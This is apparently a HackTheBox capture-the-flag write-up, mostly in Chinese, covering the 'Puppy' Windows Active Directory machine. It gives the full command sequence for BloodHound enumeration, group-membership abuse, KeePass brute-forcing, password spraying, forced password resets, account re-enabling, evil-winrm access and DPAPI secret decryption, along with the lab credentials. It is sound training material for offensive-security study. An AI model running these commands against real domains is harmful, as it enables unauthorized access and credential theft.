---
title: HackTheBox — Puppy   
date: 2025-09-27 00:00:00 +0800      
categories: [hackthebox machines]          
tags: [hackthebox]         
toc: true                           
comments: false                    
math: false                          
mermaid: false                
---

- **OS**: Windows
- **Difficulty**: Medium

## Service Enumeration

**Port Scan Results**

```bash
└─$ sudo ~/nmapAutomator/nmapAutomator.sh 10.10.11.70 all

Running all scans on 10.10.11.70

Host is likely running Windows


---------------------Starting Port Scan-----------------------



PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2049/tcp open  nfs
3260/tcp open  iscsi
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

## Initial Access

credentials: **levi.james:KingofAkron2025!**

看到 DEV share 但是沒有權限

```
└─$ nxc smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --shares
```

![image-20260211044059337](assets/img/image-20260211044059337.png)

**bloodhound** 蒐集資料

```
└─$ nxc ldap 10.10.11.70 -u levi.james -p KingofAkron2025! --bloodhound --collection All --dns-server 10.10.11.70
```

![image-20260211044102003](assets/img/image-20260211044102003.png)

```
└─$ bloodhound
```

上傳zip檔

![image-20260211044104048](assets/img/image-20260211044104048.png)

levi.james 對 developers 群組有 GenericWrite權限

![image-20260211044108654](assets/img/image-20260211044108654.png)

將 levi.james 加入 developers 群組

```
└─$ net rpc group addmem "developers" "LEVI.JAMES" -U "puppy.htb"/"LEVI.JAMES"%'KingofAkron2025!' -S "10.10.11.70"
```

進入 DEV share 看到 KeePass 檔案

```
└─$ smbclient //10.10.11.70/DEV -U levi.james
```

![image-20260211044111926](assets/img/image-20260211044111926.png)

下載到本地

```
smb: \> get recovery.kdbx
```

![image-20260211044114349](assets/img/image-20260211044114349.png)

開啟需要密碼

![image-20260211044116408](assets/img/image-20260211044116408.png)

用 [https://github.com/toneillcodes/brutalkeepass](https://github.com/toneillcodes/brutalkeepass/) 爆破出密碼 **liverpool**

```bash
└─$ python3 bfkeepass.py -d ../recovery.kdbx -w /usr/share/wordlists/rockyou.txt
```

![image-20260211044120712](assets/img/image-20260211044120712.png)

取得一些密碼

![image-20260211044123073](assets/img/image-20260211044123073.png)

密碼噴灑出有效的密碼 **ant.edwards:Antman2025!**

![image-20260211044126101](assets/img/image-20260211044126101.png)

ant.edwards 對 adam.silver 有 GenericAll 權限, 並且 adam.silver 是 remote management users 群組成員

![image-20260211044128254](assets/img/image-20260211044128254.png)

![image-20260211044131676](assets/img/image-20260211044131676.png)

更改 adam.silver 的密碼成 **Newpassword123!**

```
└─$ net rpc password "adam.silver" 'Newpassword123!' -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S "10.10.11.70"
```

![image-20260211044140807](assets/img/image-20260211044140807.png)

adam.silver 被禁用, 用 bloodyAD 啟用

```
└─$ nxc smb 10.10.11.70 -u adam.silver -p 'Newpassword123!'
```

![image-20260211044143753](assets/img/image-20260211044143753.png)

```
└─$ bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'PUPPY.HTB' --dc-ip 10.10.11.70 \
  remove uac "adam.silver" -f ACCOUNTDISABLE
```

![image-20260211044146204](assets/img/image-20260211044146204.png)

evil-winrm 登入 adam.silver

```
└─$ evil-winrm -i 10.10.11.70 -u adam.silver -p 'Newpassword123!'
```

![image-20260211044149798](assets/img/image-20260211044149798.png)

**user.txt value:**

```bash
*Evil-WinRM* PS C:\Users\adam.silver\desktop> cat user.txt
<REDACTED>
```

## Privilege Escalation

C:\backups 有一個 zip 檔案,下載下來

![image-20260211044153485](assets/img/image-20260211044153485.png)

解壓縮

```
└─$ unzip site-backup-2024-12-30.zip 
```

裡面的nms-auth-config.xml.bak 有 **steph.cooper** 的密碼 **ChefSteph2025!**

![image-20260211044157823](assets/img/image-20260211044157823.png)

![image-20260211044200401](assets/img/image-20260211044200401.png)

evil-winrm 登入 **steph.cooper**

![image-20260211044203512](assets/img/image-20260211044203512.png)

將 Master Key file 透過 smb 傳到 kali 解密

![image-20260211044207090](assets/img/image-20260211044207090.png)

![image-20260211044209136](assets/img/image-20260211044209136.png)

解出 master key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

```
└─$ impacket-dpapi masterkey -file "556a2412-1275-4ccf-b721-e6a0b4f90407" -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```

![image-20260211044211871](assets/img/image-20260211044211871.png)

將 master key 存入mk.txt 用SharpDPAPI 解出 steph.cooper_adm 的密碼 **FivethChipOnItsWay2025!**

![image-20260211044214284](assets/img/image-20260211044214284.png)

![image-20260211044216187](assets/img/image-20260211044216187.png)

![image-20260211044218719](assets/img/image-20260211044218719.png)

evil-winrm 登入 steph.cooper_adm

![image-20260211044221924](assets/img/image-20260211044221924.png)

**root.txt value:**

```bash
*Evil-WinRM* PS C:\users\administrator\desktop> cat root.txt
<REDACTED>
```
